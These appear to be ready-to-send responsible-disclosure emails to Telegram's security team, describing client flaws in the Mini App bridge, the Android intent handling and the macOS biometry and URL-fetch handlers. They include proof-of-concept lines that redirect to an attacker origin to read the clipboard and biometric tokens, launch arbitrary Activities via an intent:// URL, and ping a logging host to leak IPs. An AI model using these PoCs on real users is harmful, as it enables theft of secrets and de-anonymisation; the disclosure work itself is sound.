# Ready-to-send reports — security@telegram.org

Send each block as a separate English email to **security@telegram.org**.
Reproduce every PoC **only in Telegram's test environment**, with your own bot
created via **@BotFather** and a dedicated test account — never touch other
users. Keep the audit repository private until fixes ship. Do **not** paste any
bot token or secret into these emails.

Order to send: Email 1 (highest impact) first.

---

## EMAIL 1

**To:** security@telegram.org
**Subject:** Mini App bridge — origin-trust bypass for legacy (non–same_origin) bots on all clients

**Attack surface:** Telegram Mini App / bot WebView bridge, all official
clients (macOS, iOS, Android, Desktop, Web).

**Severity (CVSS v3.1):** 7.7 — `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N` (High).

**Description:**
The Mini App bridge binds its trust to a server flag (`same_origin` /
`sameOrigin` / `useSecuredEventProxy` / `restrictBridgeToOrigin`). When a bot's
web view is launched **without** that flag — which is the case for all legacy /
classic bots — the client performs **no origin validation** on the bridge, in
both directions, and still allows the web view to navigate to any origin. So if
the mini app's page navigates its own WebView/iframe to an attacker origin
(server-side open redirect, a compromised bot, or a malicious bot), that origin
gains full, trusted bridge access, and the client delivers bridge **answers**
(clipboard, biometric token, location, custom-method results) **to the attacker
origin**. The defect is entirely client-side; the bot is only the delivery path.

Per-client code (open-source):
- **macOS** `WebpageModalController.swift`: legacy proxy injected with no origin
  check (:1307–1310); navigation policy allows any non-link navigation
  (:1621–1623); `isTrustedMainFrameMessage` returns `true` whenever
  `sameOrigin != true` (:1695); `sendEvent` only checks origin for
  `sameOrigin==true` (:2892).
- **iOS** `WebAppWebView.swift:243` (`isTrustedMainFrameMessage` returns true
  when `!useSecuredEventProxy`), `WebAppController.swift:744` (navigation allows
  all).
- **Android** `BotWebViewContainer.java`: `onBotWebMessage` skips the origin
  check when `restrictBridgeToOrigin==false` (:1474); `isTrustedDocumentCurrent`
  returns true likewise (:1251); `shouldOverrideUrlLoading` keeps cross-origin
  https navigation in the bot WebView (:4328).
- **Desktop** `attach_bot_webview.cpp`: inbound origin check only under
  `_sameOrigin` (:2366); outbound `postEvent` origin check is empty when
  `sameOrigin==false` (:3902); navigation policy returns allow (:2537).
- **Web** `telegramWebView.ts`: inbound `onMessage` origin check is
  `if(this.origin && origin!==this.origin ...)` so it is skipped when
  `this.origin` is unset (:71); outbound posts with `this.origin || '*'` (:119);
  the bridge survives cross-origin iframe navigation because the WeakMap is keyed
  by the persisting WindowProxy (:79–81); `this.origin` is set only for
  `same_origin` bots (`webApp.tsx:202`). Your own comments at
  `telegramWebView.ts:113–115` describe exactly this leak and guard only
  same_origin bots.

**Steps to reproduce (test environment only):**
1. In the test DC, create a bot via @BotFather with a Web App / attach-menu whose
   launch does **not** set the `same_origin` flag (classic/legacy launch).
2. Host a mini-app page that on load runs
   `window.location.href = "https://<your-second-origin>/hijack"`.
3. On `<your-second-origin>/hijack`, call the bridge directly, e.g.
   `TelegramWebviewProxy.postEvent("web_app_read_text_from_clipboard", JSON.stringify({req_id:"1"}))`
   (and `web_app_biometry_request_auth` on macOS/iOS), and listen for the answer
   (`TelegramGameProxy.receiveEvent` / the iframe `message` event).
4. Open the mini app on the target client; observe the clipboard contents (and,
   on macOS/iOS, the bot's biometric token) delivered to `<your-second-origin>`,
   although it is not the bot's origin.

Web is additionally confirmable without a device: the exact bridge logic
(`telegramWebView.ts` lines 71 and 119, verbatim) accepts an attacker-origin
iframe's event and delivers the `clipboard_text_received` answer to it, while a
`same_origin` bot blocks both.

**Impact:** A malicious or compromised legacy bot can read the victim's
clipboard (passwords, 2FA codes, crypto addresses) and, on macOS/iOS, extract
the biometric-protected token stored by the legitimate bot, exfiltrating them to
an attacker origin while the UI still shows the trusted bot. No root, malware, or
physical access.

**Additional details:** Fix — enforce origin validation on the bridge
(inbound and outbound) and block cross-origin main-frame navigation regardless
of the `same_origin` flag; on Web, bind `this.origin` for every bot and never
post answers with `'*'`. macOS direct-download build is unsandboxed
(`Telegram-Mac.entitlements`: `app-sandbox=false`), broadening local impact.

---

## EMAIL 2

**To:** security@telegram.org
**Subject:** Android in-app browser — Intent Scheme Hijacking (arbitrary exported Activity launch)

**Attack surface:** Telegram Android, in-app browser / external-app launching
(`org/telegram/messenger/browser/Browser.java`, `ui/web/BotWebViewContainer.java`).

**Severity (CVSS v3.1):** 7.5 — `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N` (High).

**Description:**
When the in-app browser navigates, `shouldOverrideUrlLoading(WebView, String)`
(`BotWebViewContainer.java:4256`) calls
`Browser.openInExternalApp(context, url, allowIntent=true)` (:4275). For an
`intent://` URL, `openInExternalApp` (`Browser.java:551–584`) runs
`Intent.parseUri(uri, URI_INTENT_SCHEME)` and then `context.startActivity(intent)`
**without** clearing the attacker-controlled `component`/`selector`/`package` and
**without** the `FLAG_ACTIVITY_REQUIRE_NON_BROWSER` / `CATEGORY_BROWSABLE`
guard (those are applied only in the `!isIntentScheme` branch). This is the known
Intent Scheme Hijacking class. The handler is the deprecated String overload, so
it has no `hasGesture()` — a JS redirect to `intent://` on page load fires the
launch with no extra click. A second sink with the same unsanitized `parseUri` is
`Browser.openInExternalBrowser` (:503–518).

**Steps to reproduce (test environment only):**
1. Host an attacker page that on load runs
   `location.href = "intent://x#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.calculator2/.Calculator;end";`
   (use any installed app/component as a harmless PoC).
2. Open an https link to that page in Telegram (loads in the in-app browser).
3. Observe the targeted Activity launches with no confirmation and no extra tap.

**Impact:** Any attacker web page opened in Telegram's in-app browser launches an
arbitrary **exported** Activity of any installed app on one link open (UI redress
/ confused-deputy into other apps' exported deep links). It cannot install APKs,
run native code in Telegram, or read other apps' private data.

**Additional details:** Fix per Android guidance — for the intent-scheme branch
call `intent.setComponent(null); intent.setSelector(null); intent.setPackage(null);
intent.addCategory(Intent.CATEGORY_BROWSABLE);` before `startActivity`, and apply
the same to `openInExternalBrowser`. Not reproducible on other clients.

---

## EMAIL 3

**To:** security@telegram.org
**Subject:** macOS — web_app_share_to_story fetches bot URL before consent (IP disclosure + SSRF)

**Attack surface:** Telegram macOS, Mini App `web_app_share_to_story`
(`WebpageModalController.swift:2105–2158`).

**Severity (CVSS v3.1):** 6.5 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` (Medium).

**Description:**
On receiving `web_app_share_to_story`, the macOS client immediately calls
`fetchHttpResource(url: media_url)` with a fully bot-controlled `media_url` and
**no scheme/host validation**, **before** any consent dialog, and with no
`clickCount`/attach-menu gate. iOS guards the same handler with
`isAllowedBotMediaUrl` (`WebAppUtils.swift:33`): https-only, no URL credentials,
public-IP-only (blocks loopback/LAN), canonical IPv4/IPv6 with explicit
`inet_pton` octal-bypass hardening. macOS applies none of this.

**Steps to reproduce (test environment only):**
1. Create a bot + Mini App via @BotFather (test DC).
2. On load call
   `window.Telegram.WebApp.shareToStory("https://<your-logging-host>/px?id=test")`.
3. Observe the inbound GET at `<your-logging-host>` with the test client's real
   IP, before any consent UI. Use `http://<LAN-IP>/` to confirm SSRF reach.

**Impact:** Zero-interaction disclosure of the user's real IP and SSRF probing of
internal services, from merely opening the bot's Mini App.

**Additional details:** Fix — port iOS's `isAllowedBotMediaUrl` to macOS and/or
fetch only after explicit consent.

---

## EMAIL 4

**To:** security@telegram.org
**Subject:** macOS — web_app_request_file_download size probe leaks IP (proxy bypass) before consent

**Attack surface:** Telegram macOS, `web_app_request_file_download`
(`WebpageModalController.swift:2164–2184`) → `FileDownload.getFileSize`
(`FileDownload.swift:45–75`).

**Severity (CVSS v3.1):** 6.5 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` (Medium).

**Description:**
`web_app_request_file_download` calls `FileDownload.getFileSize(url)` on the
bot-controlled `url` **before** the download confirmation dialog. `getFileSize`
does no scheme validation and issues a HEAD request via `URLSession.shared`
directly — bypassing Telegram's in-app SOCKS/MTProxy — so the victim's real IP
leaks even with an in-app proxy configured; the returned `Content-Length` is a
size oracle for internal resources.

**Steps to reproduce (test environment only):**
1. On macOS 14+, create a bot + Mini App via @BotFather (test DC).
2. Call `window.Telegram.WebApp.downloadFile({url:"https://<your-logging-host>/probe", file_name:"x.bin"})`.
3. Observe the inbound HEAD with the real client IP before the confirmation
   dialog; confirm it ignores any Telegram in-app proxy.

**Impact:** Zero-click IP disclosure (incl. proxy bypass) and internal-resource
size oracle from opening the bot's Mini App.

**Additional details:** Fix — validate scheme/host and probe only after user
confirmation. `getFileSize` fires on macOS 14+.

---

## EMAIL 5

**To:** security@telegram.org
**Subject:** macOS — Mini App biometry: missing accessGranted check and no per-account scoping

**Attack surface:** Telegram macOS, Mini App biometry API
(`WebpageModalController.swift:2015–2104`).

**Severity (CVSS v3.1):** 7.1 — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N` (High).

**Description (two related issues):**
1. **No `accessGranted` gate.** Neither `web_app_biometry_update_token` (:2015)
   nor `web_app_biometry_request_auth` (:2055) checks
   `biometryState.accessGranted`, although `web_app_biometry_request_access`
   (:2000) does. So a Mini App can write an arbitrary token into the bot-scoped
   Keychain item with no permission, and trigger a Touch ID / password prompt and
   read the stored item without the user ever granting biometric access through
   Telegram's UI. iOS guards the read with `accessRequested && accessGranted`
   (`WebAppController.swift:2616`) and stores the token encrypted via LocalAuth;
   Android gates the write with a biometric CryptoObject. macOS does neither.
2. **No per-account scoping.** The Keychain item uses
   `kSecAttrAccount = "bot_id_<botId>"` (:2035 write, :2073 read) with no Telegram
   account id, so on a multi-account device the secret is shared across accounts:
   a token saved under account A is returned when the same bot runs under account
   B. iOS keys by `A<accountId>WebBot<botId>` and Android by
   `getSharedPreferences(PREF + currentAccount)` — both account-scoped.

**Steps to reproduce (test environment only):**
1. Create a bot + Mini App via @BotFather (test DC); do **not** call
   `web_app_biometry_request_access`.
2. Call `web_app_biometry_update_token` with `{token:"probe"}`; observe success
   with no permission grant.
3. Call `web_app_biometry_request_auth`; observe a Touch ID / password prompt with
   no prior Telegram-level grant.
4. (Scoping) Save a token under account A, switch to account B on the same
   client, open the same bot, call `web_app_biometry_request_auth`; observe
   account A's token returned.

**Impact:** Unauthorized biometric prompts attributed to a bot the user never
authorized; pre-population of the bot's Keychain item; cross-account leak of a
biometric-protected bot secret on one device. Combined with Email 1, the stored
token is exfiltrated to an attacker origin.

**Additional details:** Fix — add `guard biometryState.accessGranted` to both
handlers and include the account id in `kSecAttrAccount`.

---

## EMAIL 6 (minor; send only if you want completeness)

**To:** security@telegram.org
**Subject:** macOS — Mini App open-link gaps (missing interaction gate / scheme allowlist)

**Attack surface:** Telegram macOS, `web_app_open_tg_link` / `web_app_open_link`
(`WebpageModalController.swift:1891–1926`).

**Severity (CVSS v3.1):** ~3.1 — Low.

**Description:**
- `web_app_open_tg_link` (:1917) lacks the `clickCount > 0` gate that
  `web_app_open_link` has, so a Mini App can open arbitrary `t.me/<path>` targets
  with no interaction (same on iOS `WebAppController.swift:1330`). Sensitive t.me
  targets (socks/proxy, joinchat) remain gated by their own confirmations.
- `web_app_open_link` (:1907) does not validate the URL scheme (iOS does, via
  `web_app_allowed_protocols`). `file://`/`ton://` are blocked in
  `parseInAppLink` (`LinkParsing.swift:164`), but short custom schemes survive
  and reach `NSWorkspace.open` without confirmation (standard `tel:`/`maps:`, or
  an already-installed app's scheme).

**Impact:** Low — unsolicited navigation / short-scheme app launch; no direct
data access.

**Additional details:** Fix — add the `clickCount` gate to `web_app_open_tg_link`
and an iOS-style scheme allowlist to `web_app_open_link`.
